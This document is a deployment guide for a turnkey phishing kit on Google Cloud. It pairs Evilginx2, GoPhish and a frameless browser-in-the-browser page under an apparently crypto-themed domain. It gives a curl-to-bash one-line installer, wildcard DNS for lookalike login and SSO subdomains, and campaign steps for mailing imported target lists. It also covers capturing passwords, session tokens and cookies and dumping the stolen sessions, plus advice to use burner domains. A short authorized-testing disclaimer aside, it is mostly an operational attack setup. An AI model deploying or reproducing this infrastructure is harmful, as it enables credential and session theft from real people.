# 🚀 Frameless BITB - Automated GCP Deployment Guide

## Complete Automation from ZERO to Fully Functional Phishing Infrastructure

This guide provides **ONE-CLICK deployment** of a complete phishing infrastructure on Google Cloud Platform using Google Cloud Shell.

---

## 🎯 What Gets Deployed

- **Evilginx2** - Advanced phishing framework with reverse proxy
- **GoPhish** - Campaign management and tracking
- **Apache2** - Web server with custom substitutions
- **Frameless BITB** - Browser-in-the-browser without iframes
- **SSL Certificates** - Self-signed (with Let's Encrypt instructions)
- **Firewall Rules** - Properly configured security
- **DNS Configuration** - Cloud DNS or manual setup
- **Systemd Services** - Auto-start on boot
- **Management Scripts** - Easy service control

---

## 📋 Prerequisites

1. **Google Account** - Sign up at https://cloud.google.com
2. **Domain Name** - You need a domain (e.g., exodustraderai.info)
3. **Billing Enabled** - GCP requires a payment method
4. **Cloud Shell Access** - Available in GCP Console

---

## 🚀 Quick Start (5 Minutes Setup)

### Method 1: One-Line Deployment (Recommended)

1. Open **Google Cloud Shell**: https://console.cloud.google.com/

2. Run this single command:

```bash
curl -fsSL https://raw.githubusercontent.com/theroseinc/bitbevilgophish/main/quick-deploy.sh | bash
```

That's it! The script will:
- Create GCP project
- Configure networking
- Deploy VM
- Install all components
- Configure services

### Method 2: Manual Deployment (More Control)

1. Open **Google Cloud Shell**

2. Clone the repository:
```bash
git clone https://github.com/theroseinc/bitbevilgophish.git
cd bitbevilgophish
```

3. Edit configuration (optional):
```bash
nano config.env
# Update DOMAIN and EMAIL
```

4. Run the master deployment script:
```bash
bash master-deploy.sh
```

5. Follow the prompts:
   - Confirm configuration
   - Enable billing when prompted
   - Configure DNS when prompted
   - Wait for installation (15-30 minutes)

---

## 🎛️ Configuration Options

Edit `config.env` or set environment variables before running:

```bash
# Domain Configuration
export DOMAIN="exodustraderai.info"
export EMAIL="admin@exodustraderai.info"

# GCP Configuration
export GCP_PROJECT_ID="my-phishing-project"
export ZONE="us-central1-a"
export REGION="us-central1"
export MACHINE_TYPE="e2-medium"

# DNS Configuration
export USE_CLOUD_DNS="true"  # Use Google Cloud DNS (true/false)
```

---

## 🌐 DNS Configuration

### Option 1: Google Cloud DNS (Automatic)

The script will:
1. Create a Cloud DNS zone
2. Provide nameservers
3. You update nameservers at your registrar
4. Wait 5-10 minutes for propagation

### Option 2: Manual A Records

Add these A records at your DNS provider:

| Type | Host    | Value       | TTL  |
|------|---------|-------------|------|
| A    | @       | [SERVER_IP] | 300  |
| A    | *       | [SERVER_IP] | 300  |
| A    | login   | [SERVER_IP] | 300  |
| A    | account | [SERVER_IP] | 300  |
| A    | www     | [SERVER_IP] | 300  |
| A    | sso     | [SERVER_IP] | 300  |
| A    | portal  | [SERVER_IP] | 300  |

---

## 📊 Deployment Phases

The master script executes these phases automatically:

1. **Environment Detection** - Verify Cloud Shell
2. **Configuration Review** - Confirm settings
3. **GCP Project Setup** - Create/select project
4. **API Enablement** - Enable required APIs
5. **Static IP Reservation** - Reserve external IP
6. **DNS Configuration** - Setup Cloud DNS or manual
7. **Firewall Rules** - Configure security
8. **VM Creation** - Deploy Ubuntu 22.04 instance
9. **Installation Monitor** - Track progress
10. **Final Summary** - Access information

---

## 🔍 Monitoring Installation

### Check Installation Progress

```bash
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='sudo tail -f /var/log/phishing-setup.log'
```

### Check Service Status

```bash
gcloud compute ssh evilginx-server --zone=us-central1-a \
  --command='bitb-status'
```

---

## 🎯 Access Your Infrastructure

After deployment completes:

### Phishing Page
```
https://login.exodustraderai.info/?auth=2
```

### GoPhish Admin Panel
```
https://[SERVER_IP]:3333
```
Default credentials shown on first login

### SSH Access
```bash
gcloud compute ssh evilginx-server --zone=us-central1-a
```

---

## 🛠️ Management Commands

Once logged into the VM via SSH:

```bash
# Start all services
bitb-start

# Stop all services
bitb-stop

# Restart all services
bitb-restart

# Check status
bitb-status

# View logs (all)
bitb-logs

# View specific logs
bitb-logs apache
bitb-logs evilginx
bitb-logs gophish
```

---

## 🔒 SSL Certificates

### Self-Signed (Automatic)
Self-signed certificates are created automatically during installation.

### Let's Encrypt (Recommended)

After DNS propagates, get free SSL certificates:

```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Get certificates
sudo certbot certonly --apache \
  -d exodustraderai.info \
  -d login.exodustraderai.info \
  -d account.exodustraderai.info \
  -d www.exodustraderai.info

# Restart Apache
sudo systemctl restart apache2
```

---

## ✅ Verification Checklist

After deployment, verify everything:

```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# Run validation script
sudo bash /root/bitbevilgophish/test-setup.sh
```

This checks:
- ✅ System requirements
- ✅ Network connectivity
- ✅ DNS resolution
- ✅ Services running
- ✅ Ports listening
- ✅ SSL certificates
- ✅ File structure
- ✅ Web endpoints
- ✅ Evilginx configuration
- ✅ GoPhish configuration
- ✅ Firewall rules

---

## 🔧 Troubleshooting

### Services Not Starting

```bash
# Check logs
bitb-logs

# Restart services
bitb-restart

# Check systemd status
systemctl status apache2 evilginx gophish
```

### DNS Not Resolving

```bash
# Test DNS resolution
nslookup exodustraderai.info

# Check DNS propagation
dig exodustraderai.info

# Wait 5-10 minutes and try again
```

### SSL Certificate Errors

```bash
# Check certificate
openssl x509 -in /etc/ssl/localcerts/exodustraderai.info/fullchain.pem -text -noout

# Get Let's Encrypt certificates
sudo certbot certonly --apache -d exodustraderai.info
```

### Apache Configuration Errors

```bash
# Test configuration
sudo apache2ctl configtest

# Check error logs
sudo tail -f /var/log/apache2/error.log
```

### Firewall Issues

```bash
# Check firewall status
sudo ufw status verbose

# Allow specific port
sudo ufw allow 443/tcp
```

---

## 💰 Cost Estimate

Approximate monthly costs for GCP:

- **VM Instance (e2-medium)**: ~$25/month
- **Static IP**: ~$3/month
- **Cloud DNS**: ~$0.20/month
- **Bandwidth**: ~$1-5/month

**Total**: ~$30-35/month

### Cost Optimization

- Use preemptible instances (60-91% discount)
- Stop VM when not in use
- Use smaller machine type (e2-small)

---

## 🗑️ Cleanup / Deletion

To completely remove the infrastructure:

```bash
# Delete VM instance
gcloud compute instances delete evilginx-server --zone=us-central1-a

# Delete static IP
gcloud compute addresses delete evilginx-static-ip --region=us-central1

# Delete firewall rules
gcloud compute firewall-rules delete allow-http-phishing
gcloud compute firewall-rules delete allow-https-phishing
gcloud compute firewall-rules delete allow-dns-phishing
gcloud compute firewall-rules delete allow-gophish-admin

# Delete DNS zone (if using Cloud DNS)
gcloud dns managed-zones delete [ZONE-NAME]

# Delete project (removes everything)
gcloud projects delete [PROJECT-ID]
```

---

## 📁 File Structure

After installation:

```
/opt/
├── evilginx/
│   ├── evilginx          # Binary
│   ├── phishlets/        # Phishing templates
│   └── redirectors/      # Redirect rules
├── gophish/
│   ├── gophish           # Binary
│   ├── config.json       # Configuration
│   └── gophish.db        # Database
└── frameless-bitb/       # BITB files

/var/www/
├── home/                 # Base domain page
├── primary/              # Landing page (background)
└── secondary/            # BITB window (foreground)

/etc/apache2/
├── sites-enabled/
│   └── 000-default.conf  # Main Apache config
└── custom-subs/          # Substitution rules

/root/.evilginx/
└── config.json           # Evilginx configuration
```

---

## 🎓 Usage Guide

### Creating a Phishing Campaign

1. **Access GoPhish Admin**
   ```
   https://[SERVER_IP]:3333
   ```

2. **Create Email Template**
   - Go to "Email Templates"
   - Import or create new template
   - Use HTML from `/tmp/gophish_template.html`

3. **Create Landing Page**
   - Go to "Landing Pages"
   - Import from phishing URL
   - Or create custom page

4. **Setup SMTP**
   - Configure sending profile
   - Test email delivery

5. **Create Campaign**
   - Name your campaign
   - Select template, landing page, SMTP
   - Import target list
   - Launch!

### Capturing Credentials

Evilginx automatically captures:
- Usernames
- Passwords
- Session tokens
- Cookies

View captured sessions:
```bash
# SSH into server
gcloud compute ssh evilginx-server --zone=us-central1-a

# View Evilginx database
sudo sqlite3 /root/.evilginx/data.db "SELECT * FROM sessions;"

# Or use integration script
sudo bash /root/bitbevilgophish/gophish-integration.sh
```

---

## 🔐 Security Notes

### Operational Security

- ✅ Use VPN when accessing admin panels
- ✅ Change default passwords immediately
- ✅ Restrict GoPhish admin access by IP
- ✅ Use strong, unique passwords
- ✅ Enable 2FA on GCP account
- ✅ Regularly update system packages
- ✅ Monitor access logs
- ✅ Use burner domains
- ✅ Implement rate limiting

### Legal Considerations

⚠️ **WARNING**: This tool is for authorized security testing only!

- ✅ Obtain written authorization before testing
- ✅ Only test systems you own or have permission to test
- ✅ Follow responsible disclosure practices
- ✅ Comply with local laws and regulations
- ❌ Never use for unauthorized access
- ❌ Never target systems without permission

---

## 📚 Additional Resources

### Documentation
- [Evilginx Official Docs](https://help.evilginx.com/)
- [GoPhish User Guide](https://docs.getgophish.com/)
- [Original BITB Repo](https://github.com/waelmas/frameless-bitb)

### Video Tutorials
- [Frameless BITB Demo](https://youtu.be/luJjxpEwVHI)
- [BSides 2023 Talk](https://www.youtube.com/watch?v=p1opa2wnRvg)

### Community
- [Evilginx Mastery Course](https://academy.breakdev.org/evilginx-mastery)
- [GitHub Issues](https://github.com/theroseinc/bitbevilgophish/issues)

---

## 🆘 Support

If you encounter issues:

1. **Check logs**: `bitb-logs`
2. **Run validation**: `sudo bash test-setup.sh`
3. **Review troubleshooting**: See section above
4. **Open issue**: GitHub repository
5. **Check documentation**: Original README.md

---

## 📝 License

This project is for educational and authorized security testing purposes only.

---

## 🙏 Credits

- **Original BITB**: [waelmas/frameless-bitb](https://github.com/waelmas/frameless-bitb)
- **Evilginx**: [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
- **GoPhish**: [gophish/gophish](https://github.com/gophish/gophish)

---

## 🚀 Quick Reference Card

```bash
# DEPLOYMENT
curl -fsSL https://raw.githubusercontent.com/theroseinc/bitbevilgophish/main/quick-deploy.sh | bash

# SSH ACCESS
gcloud compute ssh evilginx-server --zone=us-central1-a

# SERVICE MANAGEMENT
bitb-start | bitb-stop | bitb-restart | bitb-status | bitb-logs

# VERIFICATION
sudo bash test-setup.sh

# CLEANUP
gcloud compute instances delete evilginx-server --zone=us-central1-a
```

---

**Made with ❤️ for authorized security testing**
